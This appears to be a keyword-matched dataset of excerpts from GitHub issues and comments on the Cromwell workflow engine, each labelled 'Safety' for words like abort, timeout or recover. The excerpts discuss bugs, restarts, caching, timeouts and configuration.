Safety,"Based on a post I made on the openWDL slack; was asked to make a ticket here. ## quick summary; Cromwell handles `/` in strings inconsistently. In some cases, it is dropped without throwing an error, in other cases it will cause an error immediately. If the string is in the WDL file itself, womtool does not detect any issues with it but it will not be handled as expected as runtime. ## use case and how to reproduce; [goleft indexcov ](https://github.com/brentp/goleft/tree/master/indexcov#indexcov) defaults to this value for --excludePattern:; `""^chrEBV$|_random$|Un_|^HLA|_alt$|hap$""`. So I set `String excludePattern = ""^chrEBV$|_random$|Un_|^HLA|_alt$|hap$""` in my WDL. That passes miniwdl check and womtool. But... * Terra will accept `^chrEBV$|^NC|_random$|Un_|^HLA\-|_alt$|hap\d$ `as a variable default or as hardcoded variable, but will handle it incorrectly -- it will not error, but it will be changed into `^chrEBV$|^NC|_random$|Un_|^HLA-|_alt$|hapd$`; * Terra will not accept `^chrEBV$|^NC|_random$|Un_|^HLA\-|_alt$|hap\d$` as an input variable via JSON; it will fail to import; * Terra will not accept `^chrEBV$|^NC|_random$|Un_|^HLA\-|_alt$|hap\d$` as an input variable if entered manually; it will throw token recognition error in the workflow menu and not allow you to submit; * Terra will accept the escaped version `^chrEBV$|^NC|_random$|Un_|^HLA\\-|_alt$|hap\\d$` as an input if entered manually or hardcoded, and will interpret it as `^chrEBV$|^NC|_random$|Un_|^HLA\-|_alt$|hap\d$`. Only tested via Terra-Cromwell, as I was previously told local-Cromwell is a lower development priority. ## expected behavior; 1. A user inputting a string as a variable vs that exact same string being a hardcoded default should be handled the same way.; 2. If Cromwell is supposed to handle `/` by requiring they be escaped as `//`, that should be documented if it isn't already.; 3. womtool should throw a warning when it sees a hardcoded variable/default with a `/` inside of it, and that wa",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7167:309,detect,detect,309,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7167,1,['detect'],['detect']
Safety,"Based on extensive log-examination, I believe this change has somehow broken the ability of a CWL workflow to survive restarts. Some suites pass some of the time due to a confluence of (1) getting lucky and avoiding a restart and (2) retries. It is very often the case that a test case only succeeds on the second or third try. Because I don't want anything to slip through the cracks due to probability, I'm not personally going to call this green until I see zero `Could not read from gs://cloud-cromwell-dev/cromwell_execution/travis/` messages.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4203#issuecomment-428253066:207,avoid,avoiding,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4203#issuecomment-428253066,1,['avoid'],['avoiding']
Safety,"Based on the conversation after standup yesterday, this ticket needs more refinement. Currently, recovering a call for the local backend is the same as executing a fresh call. It's possible there are other ways to wire recovery and that question needs to be answered. @kcibul @geoffjentry I'm returning it to the milestone backlog but hopefully something we can discuss at the prioritization today--seems like a technical/PO type of refinement.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/666#issuecomment-235909645:97,recover,recovering,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/666#issuecomment-235909645,2,['recover'],"['recovering', 'recovery']"
Safety,"Based on this [user error report](https://support.terra.bio/hc/en-us/community/posts/360043437191-Cromwell-WorkFlow-getting-aborted-intermittently-without-any-exception?page=1#community_comment_360005588172). Investigation is needed but at first glance:. * The job succeeds; * ~The workflow result copy is probably relatively long, given the size of output files~; * ~Cromwell's ""on shutdown"" logic is triggered too soon, and interrupts the result copy, which manifests as a workflow abort~; * The workflow apparently aborts shortly after the job succeeds. EDIT: Running in server mode didn't seem to help, so this is probably unrelated to the shutdown logic triggering too early, and more likely something else - an uncaught exception with the large output file perhaps?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4960:124,abort,aborted-intermittently-without-any-exception,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4960,3,['abort'],"['abort', 'aborted-intermittently-without-any-exception', 'aborts']"
Safety,"Be aware that ""Abort"" is only functional if you're using the JesBackend in your cromwell.conf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173969537:15,Abort,Abort,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173969537,1,['Abort'],['Abort']
Safety,Because sometimes things other than cromwell can cancel jobs. Also might make restarts after aborts a little more resilient in case of unexpected race conditions (not a guarantee TM),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2503:93,abort,aborts,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2503,1,['abort'],['aborts']
Safety,"Because writing to the call caching store and the job store is not atomic, the following chain of events is possible and not necessarily desirable:. - A job start; - A cache hit is found; - The outputs are copied; - The hashes / simpletons are written to the DB; - ** Cromwell Stops **: This is after the hashes are written successfully but before the EJEA had a chance to write the outputs to the job store and mark the job as complete.; - Cromwell starts; - The workflow is restarted; - The job is not found in the job store; - At this point the EJEA has a state to check if there are hashes existing for this job already. If there is, it disables call caching (so that the EJEA doesn't try to call cache to himself, and that we don't write to the hash store again - which would fail because of the unique index in the call cache table).; - However since we've disabled call caching we then proceed to try and recover the job, which fails because it was never run (since we found a cache hit the first time), and then falls back to running the job for reals. This is not great because this job already has all the outputs it needs, files have been copied already, but we run the job on top of it, which seems to increase the likelihood of having empty files at least locally when trying to read outputs and cause `cannot create an Int from """"` types of failures. Maybe a better way would be to re-use the outputs that have been written to the cache to make the job succeed and bypass all the rest. Relevant code in the EJEA: https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L153",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3074:912,recover,recover,912,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3074,1,['recover'],['recover']
Safety,Better testing of Abort endpoint,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1396:18,Abort,Abort,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1396,1,['Abort'],['Abort']
Safety,"Better theory is https://github.com/broadinstitute/firecloud-develop/pull/1556. IMO the risk/reward for the upgrade no longer checks out, especially since we are in a bit of a crunch mode and relatively ill-equipped to deal with unexpected problems.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4701:88,risk,risk,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4701,1,['risk'],['risk']
Safety,"Binding"": {; ""prefix"": ""-somatic_min_total""; },; ""default"": 300,; ""id"": ""#purple-2.44.cwl/somatic_min_total""; },; {; ""type"": [; ""null"",; ""float""; ],; ""doc"": ""Proportion of somatic deviation to include in fitted purity score. Default 1.\n"",; ""inputBinding"": {; ""prefix"": ""-somatic_penalty_weight""; },; ""default"": 1,; ""id"": ""#purple-2.44.cwl/somatic_penalty_weight""; },; {; ""type"": [; ""null"",; ""File""; ],; ""doc"": ""Optional location of somatic variant vcf to assist fitting in highly-diploid samples.\nSample name must match tumor parameter. GZ files supported.\n"",; ""inputBinding"": {; ""prefix"": ""-somatic_vcf""; },; ""secondaryFiles"": [; "".tbi""; ],; ""id"": ""#purple-2.44.cwl/somatic_vcf""; },; {; ""type"": [; ""null"",; ""File""; ],; ""doc"": ""Optional location of structural variant vcf for more accurate segmentation.\nGZ files supported.\n"",; ""inputBinding"": {; ""prefix"": ""-structural_vcf""; },; ""secondaryFiles"": [; "".tbi""; ],; ""id"": ""#purple-2.44.cwl/structural_vcf""; },; {; ""type"": ""File"",; ""doc"": ""Optional location of failing structural variants that may be recovered.\nGZ files supported.\n"",; ""inputBinding"": {; ""prefix"": ""-sv_recovery_vcf""; },; ""secondaryFiles"": [; "".tbi""; ],; ""id"": ""#purple-2.44.cwl/sv_recovery_vcf""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Number of threads\n"",; ""inputBinding"": {; ""prefix"": ""-threads""; },; ""default"": 2,; ""id"": ""#purple-2.44.cwl/threads""; },; {; ""type"": ""string"",; ""doc"": ""Name of the tumor sample. This should correspond to the value used in AMBER and COBALT.\n"",; ""inputBinding"": {; ""prefix"": ""-tumor""; },; ""id"": ""#purple-2.44.cwl/tumor""; },; {; ""type"": [; ""null"",; ""boolean""; ],; ""doc"": ""Tumor only mode. Disables somatic fitting.\n"",; ""inputBinding"": {; ""prefix"": ""-tumor_only""; },; ""default"": false,; ""id"": ""#purple-2.44.cwl/tumor_only""; }; ],; ""outputs"": [; {; ""type"": ""Directory"",; ""outputBinding"": {; ""glob"": ""$(inputs.output_dir)/""; },; ""id"": ""#purple-2.44.cwl/outdir""; }; ],; ""id"": ""#purple-2.44.cwl""; },; {; ""class"": ""Workflow"",; ""id"": ""#main"",; ""l",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:36318,recover,recovered,36318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['recover'],['recovered']
Safety,Bonus: Increase timeout on SimpleWorkflowActorSpec that sometimes takes longer than 10s from call-start to end-of-workflow.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4313:16,timeout,timeout,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4313,1,['timeout'],['timeout']
Safety,Bring abort to HtCondor. Closes #1402,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1403:6,abort,abort,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1403,1,['abort'],['abort']
Safety,Bug fix: subworkflow rows should not be included in the metadata safety limit count when subworkflows are not being expanded.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5788:65,safe,safety,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5788,1,['safe'],['safety']
Safety,Bump file read timeout to maybe reduce test failures,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4036:15,timeout,timeout,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4036,1,['timeout'],['timeout']
Safety,"But someone is one of our most important stakeholders! 😛. Totally agree with closing this, we can work out the desired behavior when we fix abort in Cromwell 50.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332687013:140,abort,abort,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332687013,1,['abort'],['abort']
Safety,"CI clone of ""Implement recoverAsync for AWS backend"" #5216",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5291:23,recover,recoverAsync,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5291,1,['recover'],['recoverAsync']
Safety,CPU on Cromwell machines pegged and unable to recover without restart,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4093:46,recover,recover,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4093,1,['recover'],['recover']
Safety,"CWL was treating output glob strings as if they were filenames, and thus was not returning the filename that Cromwell expects, namely `glob-${md5(fileName)}.list`. The implementation boils down to `OutputEvaluator` trying to detect whether the output of the expression is a glob. If it is _is_ a glob, it changes the output to be the filename as listed above.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2828:225,detect,detect,225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2828,1,['detect'],['detect']
Safety,Caching actor: Don't emit fatal timeout messages that must be ignored,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4085:32,timeout,timeout,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4085,1,['timeout'],['timeout']
Safety,Caching timeout on S3,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977:8,timeout,timeout,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977,1,['timeout'],['timeout']
Safety,Call dna_mapping_38.libraryMerge failed.:; 	inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 	outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; wdl4s.exception.VariableLookupException: Couldn't resolve all inputs for dna_mapping_38.libraryMerge at index Some(0).:; Input evaluation for Call dna_mapping_38.libraryMerge failed.:; 	inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 	outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$1.applyOrElse(JobPreparationActor.scala:49); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$1.applyOrElse(JobPreparationActor.scala:48); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.aroundReceive(JobPreparationActor.scala:18); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.Fo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:3365,recover,recoverWith,3365,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['recover'],['recoverWith']
Safety,"Can be reproduced using the following workflow. ```wdl; version 1.0. task crash {; command <<<; kill -9 $$; >>>; }. workflow crash {; call crash ; }. ```; We use a configuration with the following values:; ```HOCON; backend {; default=""SGE""; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; exit-code-timeout-seconds = 120; default-runtime-attributes {; maxRetries: 2; }; }; }; }; }; workflow-options {; workflow-failure-mode = ""ContinueWhilePossible""; }; ```; On Cromwell 37 the workflow will be run. Jobs will be killed and retried.; On Cromwell 39, the retries will not happen any more.; This is very annoying, as our cluster kills jobs that exceed the memory limit, and some java based jobs seem to have random memory spikes. Having only 1 try means basically that a workflow with 50-100 jobs will usually fail, unless we give some jobs an insane memory parameter. This is probably caused by the refactoring in:; https://github.com/broadinstitute/cromwell/pull/4654/files; EDIT: This statement was not meant to put a blame on someone. I understand that code needs to be refactored at times and that bugs can creep in. I will look if I can fix the issue myself but maybe @cjllanwarne can also have a quick look? That would be much appreciated!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4998:369,timeout,timeout-seconds,369,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4998,1,['timeout'],['timeout-seconds']
Safety,"Can you add more details? Is this at the REST endpoint level, or an internal thing? How would the user experience this issue?. Do you mean/ for example. If you abort a workflow/call running on JES via the REST endpoint, Cromwell will return a 200 OK indicating ""yes, I will try to abort this"" as opposed to 200 OK ""yes, I have aborted this"". If it's at the REST endpoint level the ""Request received"" sounds right to me. The user shouldn't have to wait for the abort to occur, and for some backends it's a best-efforts anyway (like JES' cancel operation command)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1409:160,abort,abort,160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1409,4,['abort'],"['abort', 'aborted']"
Safety,"Centaur has its own timeouts before it gives up. So does `test.inc.sh`. Setting the value in `test.inc.sh` should also set the value for centaur. https://github.com/broadinstitute/cromwell/blob/5156b786ac5fcf9db3c6c146ab9f78658a29274a/centaur/src/main/resources/reference.conf#L37-L38. https://github.com/broadinstitute/cromwell/blob/5156b786ac5fcf9db3c6c146ab9f78658a29274a/src/ci/bin/test.inc.sh#L130-L136. Currently values for centaur are set through multiple `-Dkey=value` settings inside `test_cromwel.sh`. https://github.com/broadinstitute/cromwell/blob/5156b786ac5fcf9db3c6c146ab9f78658a29274a/centaur/test_cromwell.sh#L127-L134. A couple options among others:; - This can be another `getopts` argument wired into `test_cromwell.sh`; - This could be an environment variable that overrides a default, as is currently used for setting database connection info; https://github.com/broadinstitute/cromwell/blob/5156b786ac5fcf9db3c6c146ab9f78658a29274a/src/ci/resources/build_application.inc.conf#L15-L28. A/C:; - Tests timeout at approximately the same duration in the centaur executable and the heartbeat generated by `test.inc.sh`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3874:20,timeout,timeouts,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3874,2,['timeout'],"['timeout', 'timeouts']"
Safety,Centaur tests poorly assess the format of output files in the metadata. To avoid regressions it would be preferable to have better coverage of this.; The main issue comes from the fact that files path are dynamic and hard to validate with the static test definitions centaur has.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3160:75,avoid,avoid,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3160,1,['avoid'],['avoid']
Safety,"Changed ""webservice.timeout"" to ""webservice.binding-timeout"".",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1859:20,timeout,timeout,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1859,2,['timeout'],['timeout']
Safety,Clarify exit-code-timeout-seconds docs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4905:18,timeout,timeout-seconds,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4905,1,['timeout'],['timeout-seconds']
Safety,"Closed the previous Pull Request (#841) since I ended up moving things to a new branch, but I'll address previous comments here:. Q: ""Is the system section [of application.conf] mandatory? It looks like this would throw if it's missing"" ; A: I don't think the section is mandatory in 0.19_hotfix, but looking back, it is mandatory in develop, something that needs a patch surely. Q: ""How can this [val serverMode = CromwellServer.isServerMode] be false ?"" ; A: You're right, it wasn't wired to be false ever in my previous PR. I've since changed it, please review it!. Documentation for this config change has also been updated and ready for review. Question for the reviewers: I arbitrarily moved the config to the backend stanza of the config file, since the system stanza doesn't exist anymore and the ""abortJobsOnTerminate"" config is also within the backends stanza. Is there a better place for it?. **MainSpec tests failing--it must be my changes, checking that out now, but hopefully the remaining changes can be examined in parallel**",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/889:806,abort,abortJobsOnTerminate,806,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/889,1,['abort'],['abortJobsOnTerminate']
Safety,"Closed, aborts will someday change this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1376#issuecomment-289825174:8,abort,aborts,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1376#issuecomment-289825174,1,['abort'],['aborts']
Safety,"Closes #4557 . - Adds a configurable value `token-log-interval-seconds` in the `hog-safety` stanza.; - Logs when a hog group is at its limit (no more than once per `token-log-interval-seconds` seconds per hog group); - Logs when a backend has used all tokens (no more than once per `token-log-interval-seconds` seconds per backend); - Logs the current status of the Cromwell token queues (no more than once per `token-log-interval-seconds` seconds). Sample log message:; ```; Token Dispenser: The backend Local is starting too many jobs. New jobs are being limited.; ```. Sample queue status output:; ```; ""Token Dispenser state"": {; ""queues"": [{; ""token type"": ""BACKEND=Local/TOKENLIMIT=Some(10)/HOGFACTOR=5"",; ""queue state"": {; ""queue"": [{; ""name"": ""4a458483"",; ""queue size"": 2; }, {; ""name"": ""b106f1f4"",; ""queue size"": 2; }],; ""pool"": {; ""hog groups"": [{; ""hog group"": ""4a458483"",; ""used"": 2,; ""available"": false; }, {; ""hog group"": ""b106f1f4"",; ""used"": 2,; ""available"": false; }],; ""hog limit"": 2,; ""capacity"": 10,; ""leased"": 4; }; }; }],; ""pointer"": 0,; ""total token assignments"": 4; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4567:84,safe,safety,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4567,1,['safe'],['safety']
Safety,Closes #4908. Combines the changes in #4909 (sanity check in case this happens again) and #4923 (should prevent it happening in the first place) and adds a test case for one scenario which was found to cause this problem,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4924:45,sanity check,sanity check,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4924,1,['sanity check'],['sanity check']
Safety,Closing as redundant. See #2638.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2569#issuecomment-331458725:11,redund,redundant,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2569#issuecomment-331458725,1,['redund'],['redundant']
Safety,Closing due to redundancy,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1645438301:15,redund,redundancy,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1645438301,1,['redund'],['redundancy']
Safety,Closing this as #5468 changes the underlying code and might have made this redundant.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-655510540:75,redund,redundant,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-655510540,1,['redund'],['redundant']
Safety,Closing this ticket as the test hasn't failed since #4231 was merged (4231 added span scale factor which increased the timeout duration for Jenkins).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4237#issuecomment-429876685:119,timeout,timeout,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4237#issuecomment-429876685,1,['timeout'],['timeout']
Safety,"Closing this, as far as I can tell this should not be happening anymore as per https://github.com/broadinstitute/cromwell/pull/2808 (unless the underlying jobs are indeed stuck in which case Cromwell will wait until they reach a terminal status). If that happens we talked about having a separate endpoint like ""just mark this workflow aborted anyway"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-342587383:336,abort,aborted,336,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-342587383,1,['abort'],['aborted']
Safety,Closing this. It is already fixed with a timeout-seconds options in the SFSBackend,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3648#issuecomment-769183176:41,timeout,timeout-seconds,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3648#issuecomment-769183176,1,['timeout'],['timeout-seconds']
Safety,Closing. Preferring #5887 because it's less risky and this one has another known problem lurking just around the corner.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5886#issuecomment-698589438:44,risk,risky,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5886#issuecomment-698589438,1,['risk'],['risky']
Safety,"Command:; ```bash; $ java -jar jars/cromwell-34.jar run does-not-exist.wdl; ```; The output shows a stacktrace and then hangs. It should likely exit with a non-zero status, following the convention of other command-line tools and allowing for failure detection.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4061:251,detect,detection,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4061,1,['detect'],['detection']
Safety,"Commented on at least simplifying the timeout code, possibly removing it altogether. Back to @mcovarr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/314#issuecomment-162990401:38,timeout,timeout,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/314#issuecomment-162990401,2,['timeout'],['timeout']
Safety,Configurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(Stand,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:7835,recover,recover,7835,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['recover'],['recover']
Safety,Cool! I've been thinking about how to approach this too. I looked at [shapeless' Typeable](https://github.com/milessabin/shapeless/blob/master/core/src/main/scala/shapeless/typeable.scala#L28) (and [docs](https://github.com/milessabin/shapeless/wiki/Feature-overview:-shapeless-2.0.0#type-safe-cast)) which co-exists with [ValueTypeable](https://github.com/milessabin/shapeless/blob/master/core/src/main/scala/shapeless/typeable.scala#L53) (declare from -> to types). Dunno if it has any advantages over rolling your own but it's worth a look to see if there are any.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3413#issuecomment-373570762:289,safe,safe-cast,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3413#issuecomment-373570762,1,['safe'],['safe-cast']
Safety,"Copy of #5441. This adds a mechanism of gzipping the list of output files in the AWS backend to avoid the container override size limit. This mechanism was already in place for the inputs, this will simply utilize it for the outputs as well. I tried testing it, but the new `proxy` file doesn't seem to have been used. I guess the docker image needs to be updated for that. Does anyone have any ideas on how to do that? I couldn't find where this docker image gets used in cromwell.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5447:96,avoid,avoid,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5447,1,['avoid'],['avoid']
Safety,"Correct understanding of ask timeouts, remove dead code.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/314:29,timeout,timeouts,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/314,1,['timeout'],['timeouts']
Safety,"Create a Python program which can interact with Cromwell but provide batching capabilities, submitting a batch of workflows but then being able to manage them as a group, e.g. getting status, aborting, etc.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2171:192,abort,aborting,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2171,1,['abort'],['aborting']
